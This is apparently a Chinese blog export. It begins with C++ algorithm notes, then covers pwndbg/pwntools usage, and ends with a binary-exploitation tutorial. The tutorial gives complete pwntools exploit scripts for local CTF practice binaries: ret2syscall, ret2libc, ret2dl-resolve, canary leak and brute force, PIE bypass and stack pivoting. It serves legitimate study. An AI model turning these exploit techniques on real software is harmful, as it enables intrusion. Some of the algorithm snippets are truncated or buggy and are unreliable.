for(k = 0, i = l; i &lt;= r; k++, i++) q[i] = tmp[k];&#125; 例题同上 1234567891011121314151617181920212223242526272829303132333435363738#include&lt;iostream&gt;using namespace std;const int N=1000010;int q[N],tmp[N];void merge_sort(int q[],int l,int r)&#123; if(l&gt;=r) return; int mid = l + r&gt;&gt;1; merge_sort(q,l,mid); merge_sort(q,mid+1,r); int k=0,i=l,j=mid+1; while(i&lt;=mid &amp;&amp; j&lt;=r) if(q[i]&lt;=q[j]) tmp[k++]=q[i++]; else tmp[k++]=q[j++]; while(i&lt;=mid) tmp[k++]=q[i++]; while(j&lt;=r) tmp[k++]=q[j++]; for (i=l,j=0;i&lt;=r;i++,j++) q[i]=tmp[j]; &#125;int main()&#123; int n;C++ scanf(&quot;%d&quot;,&amp;n); for (int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); merge_sort (q,0,n-1); for (int i=0;i&lt;n;i++) printf(&quot;%d &quot;,q[i]); return 0;&#125; 二分123456789101112131415161718192021222324bool check(int x) &#123;/* ... */&#125; // 检查x是否满足某种性质// 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用：int bsearch_1(int l, int r)&#123; while (l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if (check(mid)) r = mid; // check()判断mid是否满足性质 else l = mid + 1; &#125; return l;&#125;// 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用：int bsearch_2(int l, int r)&#123; while (l &lt; r) &#123; int mid = l + r + 1 &gt;&gt; 1; if (check(mid)) l = mid; else r = mid - 1; &#125; return l;&#125; 例题给定一个按照升序排列的长度为 nn 的整数数组，以及 qq 个查询。 对于每个查询，返回一个元素 kk 的起始位置和终止位置（位置从 00 开始计数）。 如果数组中不存在该元素，则返回 -1 -1。 输入格式第一行包含整数 nn 和 qq，表示数组长度和询问个数。 第二行包含 nn 个整数（均在 1∼100001∼10000 范围内），表示完整数组。 接下来 qq 行，每行包含一个整数 kk，表示一个询问元素。 输出格式共 qq 行，每行包含两个整数，表示所求元素的起始位置和终止位置。 如果数组中不存在该元素，则返回 -1 -1。 数据范围1≤n≤1000001≤n≤1000001≤q≤100001≤q≤100001≤k≤100001≤k≤10000 输入样例：123456 31 2 2 3 3 4345 输出样例：1233 45 5-1 -1 exp 在数组中查找某元素，找不到就输出-1，找到了就输出不小于该元素的最小位置和不大于该元素的最大位置。所以，需要写两个二分，一个需要找到&gt;&#x3D;x的第一个数，另一个需要找到&lt;&#x3D;x的最后一个数。 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;using namespace std;const int N=1000010;int q[N];int n,m;int main()&#123; scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i=0;i&lt;n;i++) scanf(&quot;%d&quot;,&amp;q[i]); while (m--) &#123; int x; scanf(&quot;%d&quot;,&amp;x); int l=0,r=n-1; while (l&lt;r) //找到&lt;=x的第一个数 右边界 &#123; int mid =l+r &gt;&gt;1; if(q[mid]&gt;=x) r=mid; else l=mid+1; &#125; if(q[l]!=x)cout&lt;&lt;&quot;-1 -1&quot;&lt;&lt;endl; else &#123; cout&lt;&lt;l&lt;&lt;&#x27; &#x27;; int l=0,r=n-1; while(l&lt;r) //&gt;=x的最后一个数 左边界 &#123; int mid=l+r+1&gt;&gt;1; if(q[mid]&lt;=x) l=mid; else r=mid-1; &#125; cout&lt;&lt;l&lt;&lt;endl; &#125; &#125; return 0;&#125; 高精1 度减法12345678910111213141516// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0vector&lt;int&gt; sub(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B)&#123; vector&lt;int&gt; C; for (int i = 0, t = 0; i &lt; A.size(); i ++ ) &#123; t = A[i] - t; if (i &lt; B.size()) t -= B[i]; C.push_back((t + 10) % 10); if (t &lt; 0) t = 1; else t = 0; &#125; while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;&#125; 高精度乘以低精度123456789101112131415// C = A * b, A &gt;= 0, b &gt;= 0vector&lt;int&gt; mul(vector&lt;int&gt; &amp;A, int b)&#123; vector&lt;int&gt; C; int t = 0; for (int i = 0; i &lt; A.size() || t; i ++ ) &#123; if (i &lt; A.size()) t += A[i] * b; C.push_back(t % 10); t /= 10; &#125; while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back();&#125; 高精度除以低精度12345678910111213141516// A / b = C ... r, A &gt;= 0, b &gt; 0vector&lt;int&gt; div(vector&lt;int&gt; &amp;A, int b, int &amp;r)&#123; vector&lt;int&gt; C; r = 0; for (int i = A.size() - 1; i &gt;= 0; i -- ) &#123; r = r * 10 + A[i]; C.push_back(r / b); r %= b; &#125; reverse(C.begin(), C.end()); while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); r&#125; 前缀和一维 12S[i] = a[1] + a[2] + ... a[i]a[l] + ... + a[r] = S[r] - S[l - 1] 二维 123S[i, j] = 第i行j列格子左上部分所有元素的和以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为：S[x2, y2] - S[x1 - 1, y2] - S[x2, y1 - 1] + S[x1 - 1, y1 - 1] 差分一维 1给区间[l, r]中的每个数加上c：B[l] += c, B[r + 1] -= c 二维 12给以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵中的所有元素加上c：S[x1, y1] += c, S[x2 + 1, y1] -= c, S[x1, y2 + 1] -= c, S[x2 + 1, y2 + 1] += c ![ 1 ](https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207081703562.png) b[x1][ y1 ] +&#x3D;c ; 对应图1 ,让整个a数组中蓝色矩形面积的元素都加上了c。b[x1,][y2+1]-&#x3D;c ; 对应图2 ,让整个a数组中绿色矩形面积的元素再减去c，使其内元素不发生改变。b[x2+1][y1]- &#x3D;c ; 对应图3 ,让整个a数组中紫色矩形面积的元素再减去c，使其内元素不发生改变。b[x2+1][y2+1]+&#x3D;c; 对应图4,,让整个a数组中红色矩形面积的元素再加上c，红色内的相当于被减了两次，再加上一次c，才能使其恢复。 双指针算法123456789for (int i = 0, j = 0; i &lt; n; i ++ )&#123; while (j &lt; i &amp;&amp; check(i, j)) j ++ ; // 具体问题的逻辑&#125;常见问题分类： (1) 对于一个序列，用两个指针维护一段区间 (2) 对于两个序列，维护某种次序，比如归并排序中合并两个有序序列的操作 离散化12345678910111213141516vector&lt;int&gt; alls; // 存储所有待离散化的值sort(alls.begin(), alls.end()); // 将所有值排序alls.erase(unique(alls.begin(), alls.end()), alls.end()); // 去掉重复元素// 二分求出x对应的离散化的值int find(int x) // 找到第一个大于等于x的位置&#123; int l = 0, r = alls.size() - 1; while (l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if (alls[mid] &gt;= x) r = mid; else l = mid + 1; &#125; return r + 1; // 映射到1, 2, ...n&#125; 例题：假定有一个无限长的数轴，数轴上每个坐标上的数都是 00。 现在，我们首先进行 nn 次操作，每次操作将某一位置 xx 上的数加 cc。 接下来，进行 mm 次询问，每个询问包含两个整数 ll 和 rr，你需要求出在区间 [l,r][l,r] 之间的所有数的和。 输入格式第一行包含两个整数 nn 和 mm。 接下来 nn 行，每行包含两个整数 xx 和 cc。 再接下来 mm 行，每行包含两个整数 ll 和 rr。 输出格式共 mm 行，每行输出一个询问中所求的区间内数字和。 数据范围−109≤x≤109−109≤x≤109,1≤n,m≤1051≤n,m≤105,−109≤l≤r≤109−109≤l≤r≤109,−10000≤c≤10000−10000≤c≤10000 输入样例：12345673 31 23 67 51 34 67 8 输出样例：123805 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;typedef pair&lt;int, int&gt; PII;const int N = 300010;int a[N], s[N];int n, m;vector&lt;int&gt; alls;vector&lt;PII&gt; add, query;int find(int x)&#123; int l = 0, r = alls.size() - 1; while(l &lt; r) &#123; int mid = l + r &gt;&gt; 1; if(alls[mid] &gt;= x) r = mid; else l = mid + 1; &#125; return r + 1;&#125;vector&lt;int&gt;:: iterator unique(vector&lt;int&gt; &amp;a)&#123; int j = 0; for(int i = 0; i &lt; a.size(); i ++) if(!i || a[i] != a[i - 1]) a[j ++ ] = a[i]; return a.begin() + j;&#125;int main()&#123; cin &gt;&gt; n &gt;&gt; m; for(int i = 0; i &lt; n; i ++ ) &#123; int x, c; cin &gt;&gt; x &gt;&gt; c; add.push_back(&#123;x, c&#125;); alls.push_back(x); &#125; for(int i = 0; i &lt; m; i ++ ) &#123; int l, r; cin &gt;&gt; l &gt;&gt; r; query.push_back(&#123;l, r&#125;); alls.push_back(l); alls.push_back(r); &#125; sort(alls.begin(), alls.end()); alls.erase(unique(alls), alls.end()); for(auto item : add) &#123; int x = find(item.first); a[x] += item.second; &#125; for(int i = 1; i &lt;= alls.size(); i ++ ) s[i] = s[i - 1] + a[i]; for(auto item : query) &#123; int l = find(item.first), r = find(item.second); cout &lt;&lt; s[r] - s[l - 1] &lt;&lt; endl; &#125; return 0;&#125; 区间合并1）把要合并的区间按区间左端点从小到大排序2）用st和ed指针从前往后维护区间3）比较ed 和后一个区间的左端点，分情况更新ed和first 1234567891011121314151617181920// 将所有存在交集的区间合并void merge(vector&lt;PII&gt; &amp;segs)&#123; vector&lt;PII&gt; res; sort(segs.begin(), segs.end()); int st = -2e9, ed = -2e9; for (auto seg : segs) //定义了一个自动类型变量seg, seg的取值从segs[0]开始到segs末尾，也就是遍历了segs if (ed &lt; seg.first) &#123; if (st != -2e9) res.push_back(&#123;st, ed&#125;); st = seg.first, ed = seg.second; &#125; else ed = max(ed, seg.second); if (st != -2e9) res.push_back(&#123;st, ed&#125;); segs = res;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"}],"keywords":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}]},{"title":"pwndbg/pwntools","slug":"pwn入门","date":"2022-07-05T16:00:00.000Z","updated":"2022-07-06T07:57:03.183Z","comments":true,"path":"2022/07/06/pwn入门/","link":"","permalink":"http://example.com/2022/07/06/pwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"pwndbg&#x2F;gdb的使用X的使用x 是 examine 的缩写 n 表示要显示的内存单元的个数 u 表示一个地址单元的长度： b 表示单字节h 表示双字节w 表示四字节g 表示八字节f 表示显示方式，可取如下值： x 按十六进制格式显示变量d 按十进制格式显示变量u 按十进制格式显示无符号整型o 按八进制格式显示变量t 按二进制格式显示变量a 按十六进制格式显示变量i 指令地址格式c 按字符格式显示变量f 按浮点数格式显示变量举例x &#x2F;20gx buf: 表示从内存地址 buf 读取内容，g 表示八字节，20 表示 20 个单位，x 按十六进制格式显示变量 x &#x2F;3hu buf：表示从内存地址 buf 读取内容，h 表示以双字节为一个单位，3 表示三个单位，u 表示十进制格式显示无符号整型 P的使用打印指令p(print)：p fun_name &#x2F;&#x2F;打印fun_name的地址，需要保留符号p 0x10-0x08 &#x2F;&#x2F;计算0x10-0x08的结果p &amp;a &#x2F;&#x2F;查看变量a的地址p *(0x123456) &#x2F;&#x2F;查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号p $rdi &#x2F;&#x2F;显示rdi寄存器的值，注意和x的区别，这只是显示rdi的值，而不是rdi指向的值p *($rdi) &#x2F;&#x2F;显示rdi指向的值 cycliccyclic n ：生成长度为n的字符串 cyclic -l aaaa #查找偏移（一般是返回地址 假如说我想找aaaj这个字符串的偏移，我们可以用 1cyclic_find(&#x27;aaaj&#x27;) 其他info all-registers 查看所有的寄存器的值 pwntools的使用p32 p64就是将一个数字转换为字符，例如 1p32(0xdeadbeef) 就会转换为 1&#x27;\\xef\\xbe\\xad\\xde&#x27; 这里顺序反了是因为linux编译的程序是小端序的 u32 u64就是将字符转换为数字，","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"入门","slug":"入门","permalink":"http://example.com/tags/%E5%85%A5%E9%97%A8/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}]},{"title":"栈溢出","slug":"栈溢出","date":"2022-07-05T16:00:00.000Z","updated":"2022-07-14T08:31:00.199Z","comments":true,"path":"2022/07/06/栈溢出/","link":"","permalink":"http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"ret2syscallLinux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数 应用程序调用系统调用的过程是： 1、把系统调用的编号存入 EAX 2、把函数参数存入其它通用寄存器 3、触发 0x80 号中断（int 0x80） 在32位下： 1.将EAX寄存器的值设置为OXb:EAX &#x3D; OXb 3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; 0 3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; o 64位下： 1.将RAX寄存器的值设置为0×3b:RAX &#x3D; OX3b 2.将RDI寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:RDI &#x3D; &amp;(“ &#x2F;bin&#x2F;sh”) 3.将RSI和RDX寄存器的值都设为0: RSI &#x3D; RDX &#x3D; o 只需要让栈顶的值 然后可以通过 pop eax 达到目的 例（CTFwiki）： 计算偏移 运用ropper 查找int 0x80系统调用 1ropper -f ret2syscall --search &quot;int 0x80&quot; 运用ropper 查找其他寄存器 1ropper -f ret2syscall --search &quot;pop|ret&quot;| grep &#x27;eax&#x27; 其他类推 在IDA找到bin&#x2F;sh的地址 exp: 123456789101112131415161718192021222324from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./ret2syscall&quot;)if args.G: gdb.attach(p)pop_eax_ret = 0x080bb196pop_ebx_ret = 0x080481c9pop_ecx_ebx_ret = 0x0806eb91pop_edx_ecx_ebx_ret = 0x0806eb90pop_edx_ret = 0x0806eb6aint_0x80 = 0x08049421bin_sh_addr = 0x80be408p.recvuntil(&quot;What do you plan to do?\\n&quot;)payload = b&quot;a&quot;*112 + p32(pop_eax_ret) payload += p32(0xb) + p32(pop_edx_ecx_ebx_ret) payload += p32(0) + p32(0) + p32(bin_sh_addr) payload += p32(int_0x80)p.sendline(payload)p.interactive() ret2libc 例1：在ida找到bin&#x2F;sh字符串地址 查找到system函数存在地址 123456from pwn import *p = process(&quot;./ret2libc1&quot;)p.recvuntil(&quot;RET2LIBC &gt;_&lt;\\n&quot;)payload = b&quot;a&quot;*112 + p32(0x8048460) + b&quot;xxxx&quot; + p32(0x8048720)p.sendline(payload)p.interactive() 例2没有system函数。也没有binsh字符串 system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下 https://github.com/niklasb/libc-database 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。 基本利用思路如下 泄露 puts函数 地址 获取 libc 版本 获取 system 地址与 &#x2F;bin&#x2F;sh 的地址 再次执行源程序 触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’) 单步运行过puts函数，查询got表 通过vmmap找到对应libc的基地址，并且计算偏移 再计算system函数的偏移 然后searh “bin&#x2F;sh”的地址，再计算bin&#x2F;sh1的偏移 123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./ret2libc2&quot;)if args.G: gdb.attach(p)gets_plt = 0x8048440puts_plt = 0x8048460main_addr = 0x8048618puts_got = 0x804a018p.recvuntil(&quot;Can you find it !?&quot;)payload = b&quot;a&quot;*112 + p32(puts_plt) + p32(main_addr) + p32(puts_got)p.sendline(payload)puts_addr = u32(p.recv(4))libc_addr = puts_addr - 0x6dc30system_addr = libc_addr + 0x41790bin_sh_addr = libc_addr + 0x18e363success(&quot;puts_addr: &quot; + hex(puts_addr))success(&quot;system_addr: &quot; + hex(system_addr))success(&quot;bin_sh_addr: &quot; + hex(bin_sh_addr))p.recvuntil(&quot;Can you find it !?&quot;)payload1 = b&quot;a&quot;*104 + p32(system_addr) + b&quot;xxxx&quot; + p32(bin_sh_addr)#payload1 = b&quot;a&quot;*104 + p32(gets_plt) + p32(system_addr) + p32(0x804a020) + p32(0x804a020)p.sendline(payload1)&#x27;&#x27;&#x27;sleep(0.2)p.sendline(&quot;/bin/sh\\x00&quot;)&#x27;&#x27;&#x27;p.interactive() ret2dl ELF关于动态链接的关键segment： .dynamic:一般保存了ELF文件依赖于哪些动态库,动态符号节信息; 各segment的位置关系: .dynamic的地址加Ox44的位置是. dynstr;.dynamic的地址加Ox4c的位置是. dynsym;.dynamic的地址加Ox84的位置是.rel.plt; 第一次调用一个函数时_dl_runtime_resolve函数的工作: _dl_runtime resolve(link map_obj, reloc index)： 1.首先用link_map访问.dynamic，分别取出.dynstr、.dynsym、.rel.plt的地址; 2..rel.plt ＋参数reloc_index,求出当前函数的重定位表项Elf32_Rel的指针，记作rel; 3.rel-&gt;r_info &gt; &gt;8&#x3D; n作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;4..dynstr + sym-&gt;st_name得出符号名字符串指针; 5.在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表; 6.最后调用这个函数; 例题： 思路: exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27; ,&#x27;-c&#x27;]name = &#x27;./pwn&#x27;p = process(name)#p=remote(&#x27;chall.pwnable.tw&#x27;, 10103)elf= ELF(name)#libc = ELF(&#x27;./libc_32.so.6&#x27;)if args.G: gdb.attach(p) rel_plt_addr = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addr #0x8048330dynsym_addr = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addr #0x80481d8dynstr_addr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr #0x8048278resolve_plt = 0x08048380leave_ret_addr = 0x0804851d start = 0x804aa00fake_rel_plt_addr = startfake_dynsym_addr = fake_rel_plt_addr + 0x8fake_dynstr_addr = fake_dynsym_addr + 0x10bin_sh_addr = fake_dynstr_addr + 0x7n = fake_rel_plt_addr - rel_plt_addrr_info = (int((fake_dynsym_addr - dynsym_addr)/0x10) &lt;&lt; 8) + 0x7str_offset = fake_dynstr_addr - dynstr_addrfake_rel_plt = p32(elf.got[&#x27;read&#x27;]) + p32(r_info)fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)fake_dynstr = b&quot;system\\x00/bin/sh\\x00\\x00&quot;pay1 = b&#x27;a&#x27;*108 + p32(start - 20) + p32(elf.plt[&#x27;read&#x27;]) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)p.recvuntil(&#x27;Welcome to RET_TO_DL~!\\n&#x27;)#p.recvuntil(&quot;Nice to meet you~!\\n&quot;)p.sendline(pay1)sleep(1)pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + b&#x27;aaaa&#x27; + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstrp.sendline(pay2)success(&quot;.rel_plt: &quot; + hex(rel_plt_addr))success(&quot;.dynsym: &quot; + hex(dynsym_addr))success(&quot;.dynstr: &quot; + hex(dynstr_addr))success(&quot;fake_rel_plt_addr: &quot; + hex(fake_rel_plt_addr))success(&quot;fake_dynsym_addr: &quot; + hex(fake_dynsym_addr))success(&quot;fake_dynstr_addr: &quot; + hex(fake_dynstr_addr))success(&quot;n: &quot; + hex(n))success(&quot;r_info: &quot; + hex(r_info))success(&quot;offset: &quot; + hex(str_offset))success(&quot;system_addr: &quot; + hex(fake_dynstr_addr))success(&quot;bss_addr: &quot; + hex(elf.bss()))p.interactive() 击败cancary基本原理函数开始执行的时候会先往栈底插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法(栈帧销毁前测试该值是否被改 变)，如果不合法就停止程序运行(发生了栈溢出); 在Linux当中我们将这段cookie信息称为Canary ,Canary是一个低字节为\\x00的16进制数; 因为Canary在局部变量的后边,在EBP或RBP的前面所以当攻击者覆盖返回地址的时候往往也会将cookie信息给覆盖掉,这就会导致栈保护检查失败而阻止payload的执行,从而避免漏洞利用成功. 绕过方法方法一:泄露栈中的Canary: Canary设计为以字节×O0O结尾,其本意就是为了保证Canary 可以截断字符串,防止我们输出字符串的时候将Canary打印出来;所以泄露栈中的Canary的思路是将Canary的低字节\\x00覆盖，然后连同用户的字符串一起打印出剩余的Canary部分; 当我们打印出完整的Canary后,在溢出的时候再将正确Canary填回去,就可以进行控制返回地址,控制程序流程了. 条件: 1.有合适的输出函数 2.泄露Canary后程序不会崩溃 例题： exp： 12345678910111213141516171819202122232425from pwn import *#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]name = &#x27;./pwn1&#x27;p = process(name)elf = ELF(name)if args.G: gdb.attach(p)p.recvuntil(&quot;Welcome!\\n&quot;)payload = &quot;a&quot;*28 + &quot;b&quot;*4p.sendline(payload)p.recvuntil(&quot;bbbb&quot;)canary = u32(p.recv(4)) - 0xasuccess(&quot;canary: &quot; + hex(canary))getshell_addr = 0x804858bpayload1 = b&quot;a&quot;*32 + p32(canary) + b&quot;b&quot;*12 + p32(getshell_addr)p.sendline(payload1)p.interactive() 方法二:爆破Canary: 对于Canary,虽然每次进程重启后的Canary 不同(相比GS，GS重启后是相同的)但是同一个进程中的不同线程的Canary 是相同的,并且通过fork函数创建的子进程的Canary也是相同的,因为fork函数会直接拷贝父进程的内存。 我们可以利用这样的特点，彻底逐个字节将Canary爆破出来. 缺点:多进程程序,32位程序需要爆破3字节,64位程序需要爆破7字节,需要爆破较多. 其他方法: 1.联合其他漏洞修改劫持_stack_chk_fail函数; 例题： 1234567891011121314151617181920212223242526from pwn import *name = &#x27;./pwn2&#x27;p = process(name)elf = ELF(name)p.recvuntil(&#x27;welcome\\n&#x27;)canary = &#x27;\\x00&#x27;for i in range(3): print(hex(i)) for j in range(256): print(hex(j)) p.send(&#x27;a&#x27;*100 + canary + chr(j)) a = p.recvuntil(&quot;welcome\\n&quot;) if b&quot;recv&quot; in a: canary += chr(j) breakcanary = u32(canary)success(&quot;canary: &quot; + hex(canary))getflag = 0x0804863Bpayload = b&#x27;a&#x27;*100 + p32(canary) + b&#x27;a&#x27;*12 + p32(getflag)p.sendline(payload)p.interactive() PIE绕过：position-independent executable,地址无关可执行文件,该技术就是一个针对代码段.text,数据段.*data，.bss等固定地址的一个防护技术应用了PIE的程序会在每次加载时都变换加载基址，从而使ropper等工具无法得到准确的地址. 方法一: Partial Write部分写入技术,由于内存的页载入机制，PIE的随机化只能影响到单个内存页;通常来说,一个内存页大小为Ox1000,这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的就是利用了PIE后12位地址不变的特点,通过覆盖EIP的后8或16位(按字节写入每字节8位)就可以快速爆破或者直接劫持EIP; 特点: 1.程序不大,有后门函数等;2.只需要爆破一个字节 例题 1234567891011121314151617181920212223242526272829from pwn import *i = 0while True: i += 1 print (i) if(i &gt; 0xff): print(&quot;Wrong!&quot;) break io = process(&quot;./partial_write&quot;) io.recv() payload = &#x27;a&#x27;*40 payload += &#x27;\\xca&#x27; #strncpy复制202个字节造成溢出 io.sendline(payload) io.recv() payload = &#x27;a&#x27;*200 payload += &#x27;\\x01\\x39&#x27; #frontdoor的地址后三位是0x900, +1跳过push rbp 爆破的是3 io.sendline(payload) io.recv() try: io.recv(timeout = 1) except EOFError: io.close() continue else: sleep(0.1) io.sendline(&#x27;/bin/sh\\x00&#x27;) sleep(0.1) io.interactive() #没有EOFError的话就是爆破成功，可以开shell break 方法二:直接泄露地址因为PIE影响的只是程序加载基址，并不会影响指令间的相对地址,如果我们可以泄露出一个程序或ibc的某些地址，我们就可以利用地址减去偏移地址得到基地址,从而算出其他函数的地址,这种方法也是我们最常用的方法.通过泄露地址来计算libc基地址的时候需要注意的是libc版本不同,对应的偏移也不同. 例题： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]name = &#x27;./pwn1&#x27;p = process(name)elf = ELF(name)if args.G: gdb.attach(p)p.recvuntil(&quot;Tell me your name:\\n&quot;)payload = &quot;a&quot;*8p.send(payload)p.recvuntil(&quot;a&quot;*8)pro_addr = u64(p.recv(6) + b&quot;\\x00\\x00&quot;) - 0x82dputs_got_addr = pro_addr + elf.got[&#x27;puts&#x27;]puts_plt_addr = pro_addr + elf.plt[&#x27;puts&#x27;]main_addr = pro_addr + elf.symbols[&#x27;main&#x27;]success(&quot;pro_addr: &quot; + hex(pro_addr))success(&quot;puts_got_addr: &quot; + hex(puts_got_addr))success(&quot;puts_plt_addr: &quot; + hex(puts_plt_addr))success(&quot;main_addr: &quot; + hex(main_addr))p.recvuntil(&quot;What do you want to say?\\n&quot;)pop_rdi_addr = pro_addr + 0x843payload1 = b&quot;a&quot;*184 payload1 += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr)payload1 += p64(main_addr)p.sendline(payload1)p.recvuntil(&quot;Bye!\\n&quot;)libc_addr = u64(p.recv(6) + b&quot;\\x00\\x00&quot;) - 0x68f90system_addr = libc_addr + 0x3f480bin_sh_addr = libc_addr + 0x1619d9success(&quot;libc_addr: &quot; + hex(libc_addr))success(&quot;system_addr: &quot; + hex(system_addr))success(&quot;bin_sh_addr: &quot; + hex(bin_sh_addr))p.recvuntil(&quot;Tell me your name:\\n&quot;)p.sendline(&quot;aaa&quot;)p.recvuntil(&quot;What do you want to say?\\n&quot;)payload2 = b&quot;c&quot;*184 payload2 += p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr) p.sendline(payload2)p.interactive() 整数溢出：类型一:未限制范围这种情况主要是变量有固定大小的字节,但是却允许我们输入无限多的数据,和gets()函数产生的栈溢出很相似 类型二:错误的类型转换正确的对变量进行了约束但是在类型转换上面出错了,范围大的变量赋值给范围小的变量 例题： 程序为dest分配了0x14字节的储存空间，而第二个read函数可以读取0x199个字节，这个地方存在栈溢出 12345678910111213from pwn import *p = process(&quot;./int_over&quot;)payload = b&quot;a&quot;*24 + p32(0x804868b)payload += b&quot;b&quot;*(0x104 - len(payload))p.recvuntil(&quot;Your choice:&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Please input your username:\\n&quot;)p.sendline(&quot;sir&quot;)p.recvuntil(&quot;Please input your passwd:\\n&quot;)p.sendline(payload)p.interactive 栈迁移：劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP等操作;通俗的讲其实就是将ESP或RSP指针修改为我们可以控制的内存区地址比如bss段堆等位置,然后在可控内存区当中布置payload等; 条件: 1.程序存在溢出;2.可以控制sp指针; 用途: 1.栈益出可以溢出的空间大小不足 因为我们的主要思想是修改sp指针,所以我们需要通过一些汇编指令来修改sp指针,常用汇编指令:; 1.pop esp;2.pop ecx; lea esp,[ecx-Ox4];3.leave; ret; —&gt; mov esp, ebp; pop ebp; ret; 需要注意的地方: 1.迁移过去的内存一定要可读可写; ⒉.迁移过去的内存要注意离不可读不可写的内存要远一些,因为调用一些函数的时候需要较大的栈空间; 3.我们构造的栈空间和程序的栈空间有相同的性质,即push,pop等操作对sp,bp指针的操作一样; 例题： 1234567891011121314151617181920212223242526272829from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./test1&quot;)if args.G: gdb.attach(p)bin_sh_addr = 0x80495d0system_plt = 0x8048370read_plt = 0x8048340leave_ret = 0x80484d5pop3_ret = 0x080485a9gadgets = 0x8048549bss = 0x804a560payload = p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss) + p32(100) payload += p32(gadgets) + p32(bss + 4)p.recvuntil(&quot;Hello,tell me your story:\\n&quot;)p.sendline(payload)payload1 = b&quot;b&quot;*10 + p32(0x804a060 + 4)p.recvuntil(&quot;By the way, what&#x27;s your name:\\n&quot;)p.sendline(payload1)sleep(1)payload2 = p32(system_plt) + b&quot;aaaa&quot; + p32(bin_sh_addr) 